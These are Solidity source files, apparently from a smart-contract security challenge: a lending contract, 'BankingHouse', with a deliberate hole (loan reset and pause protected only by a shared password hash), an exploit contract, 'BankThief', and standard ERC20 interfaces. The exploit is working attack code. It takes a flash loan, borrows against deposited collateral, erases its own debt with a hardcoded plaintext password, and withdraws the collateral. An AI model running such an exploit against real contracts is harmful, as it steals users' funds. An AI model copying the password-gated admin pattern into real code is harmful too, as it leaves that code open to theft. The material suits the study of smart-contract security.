// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../BankingHouse.sol";

contract BankThief {

    BankingHouse private bank;
    address constant VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    constructor() { }

    function initialize(BankingHouse _bank) external {
        require(address(bank) == address(0), "Already initialized");
        bank = _bank;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == VAULT, "Not authorized");
        require(tokens.length == 1, "Number of tokens");

        (int256 coinAmount) = abi.decode(userData, (int256));

        tokens[0].approve(address(bank), amounts[0]);

        bank.deposit(amounts[0]);
        bank.transactCoin(coinAmount);
        bank.resetLoan(address(this), "[email protected]_PA55WORD");
        bank.withdraw(amounts[0]);
        
        tokens[0].transfer(VAULT, amounts[0] + feeAmounts[0]);   
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract BankingHouse {

    bytes32 constant PASSWORD_HASH = 0x3a1cf401d67c55af5baa816bfb6f886bdb7ff802e35c98333ce62b2843dfdbb2;
    uint256 constant REQUIRED_COLLATERAL = 1000 ether;
    
    IERC20 public immutable gold;
    IERC20 public immutable coin;

    bool public paused;
    mapping(address => uint256) public deposits;
    mapping(address => int256) public loans;

    constructor(IERC20 _gold, IERC20 _coin) {
        gold = _gold;
        coin = _coin;
    }

    function deposit(uint256 amount) external {
        if (paused) { return; }

        gold.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
    }

    function transactCoin(int256 amount) external {
        if (amount > 0) {
            require(
                deposits[msg.sender] >= REQUIRED_COLLATERAL, 
                "Borrower has insufficient gold collateral"
            );
            loans[msg.sender] += amount;
            coin.transfer(msg.sender, uint256(amount));
        } else {
            loans[msg.sender] += amount;
            coin.transferFrom(
                msg.sender,
                address(this), 
                uint256(-amount)
            );
        }
    }

    function withdraw(uint256 amount) external {
        if (paused || loans[msg.sender] > 0) { return; }

        deposits[msg.sender] -= amount;
        gold.transfer(msg.sender, amount);
    }

    function resetLoan(
        address borrower,
        string calldata password
    ) external {
        require(keccak256(bytes(password)) == PASSWORD_HASH);
        loans[borrower] = 0;
    }

    function setPaused(
        bool _paused,
        string calldata password
    ) external {
        require(keccak256(bytes(password)) == PASSWORD_HASH);
        paused = _paused;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (interfaces/IERC20.sol)

pragma solidity ^0.8.0;

import "../token/ERC20/IERC20.sol";

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}